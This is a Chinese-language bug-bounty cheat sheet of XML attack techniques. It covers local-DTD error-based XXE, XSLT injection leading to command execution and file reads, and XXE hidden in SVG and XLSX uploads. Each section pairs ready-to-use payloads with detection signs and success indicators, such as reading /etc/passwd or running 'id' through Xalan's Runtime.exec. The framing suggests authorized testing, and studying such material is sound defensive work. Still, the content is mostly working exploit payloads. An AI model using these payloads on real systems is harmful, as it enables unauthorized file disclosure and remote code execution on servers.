## SRC 猎手补充手法

### Local DTD 利用（无出网场景）
- **认什么**：目标无法出网（出站防火墙/无 DNS）但存在 XXE；目标系统有已知 DTD 文件（Linux/Windows/Java JAR 内置 DTD）
- **打法**：利用本地已有的 DTD 文件重定义参数实体触发错误回显：
  ```xml
  <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexist/&#x25;file;&#x27;>">
      &#x25;eval;
      &#x25;error;
    '>
    %local_dtd;
  ]>
  ```
  常用本地 DTD 路径：
  - Linux：`/usr/share/yelp/dtd/docbookx.dtd`（GNOME）、`/usr/share/xml/fontconfig/fonts.dtd`
  - Windows：`C:\Windows\System32\wbem\xml\cim20.dtd`、`C:\Windows\System32\wbem\xml\wmi20.dtd`
  - Java JAR：`jar:file:///opt/app/lib/spring-beans.jar!/org/springframework/beans/factory/xml/spring-beans.dtd`
- **算成**：错误消息中回显出 `/etc/passwd` 或敏感配置文件内容
- **假点**：目标系统该 DTD 文件不存在（最小化安装/容器镜像）；解析器不支持 `jar:` 协议

### XSLT 注入到 RCE 链
- **认什么**：目标接受 XML/XSL 输入做转换（报表导出/PDF 生成/邮件模板）；后端使用 Xalan/Saxon/libxslt；错误信息包含 `TransformerException`/`XSLT`
- **打法**：注入 XSLT 扩展函数执行命令：
  ```xml
  <!-- Xalan (Java) -->
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" version="1.0">
    <xsl:template match="/">
      <xsl:variable name="cmd" select="rt:exec(rt:getRuntime(),'id')"/>
    </xsl:template>
  </xsl:stylesheet>

  <!-- libxslt (PHP/Python) — 读文件 -->
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:str="http://exslt.org/strings" version="1.0">
    <xsl:template match="/">
      <xsl:value-of select="document('/etc/passwd')"/>
    </xsl:template>
  </xsl:stylesheet>
  ```
- **算成**：命令执行输出（`uid=0(root)`）出现在转换结果中；或读到服务端文件内容
- **假点**：XSLT 处理器禁用了扩展函数（`-noextfun`）；`SecurityManager` 拦截了 `Runtime.exec`

### SVG/XLSX 嵌入式 XXE
- **认什么**：上传接口接受 SVG 图片（头像/Logo）或 XLSX/DOCX/PPTX 文件（导入/解析）；后端解压 ZIP 结构后用 XML 解析器处理内部 XML
- **打法**：
  ```xml
  <!-- SVG XXE -->
  <?xml version="1.0"?>
  <!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <text x="0" y="20">&xxe;</text>
  </svg>
  ```
  XLSX：解压 `.xlsx` → 编辑 `xl/workbook.xml` 或 `[Content_Types].xml` 注入 DTD → 重新打包上传
  ```bash
  unzip report.xlsx -d evil/ && \
  # 编辑 evil/[Content_Types].xml 注入 <!DOCTYPE ... ENTITY> && \
  cd evil && zip -r ../evil.xlsx . && cd ..
  ```
- **算成**：上传后预览/导出页面中出现 `/etc/hostname` 内容；或 OOB DNS/HTTP 回连到攻击者服务器
- **假点**：后端用安全库（如 Apache POI 4.x+ 默认禁 DTD）；SVG 被转成 PNG 不解析 XML；上传后不回显内容

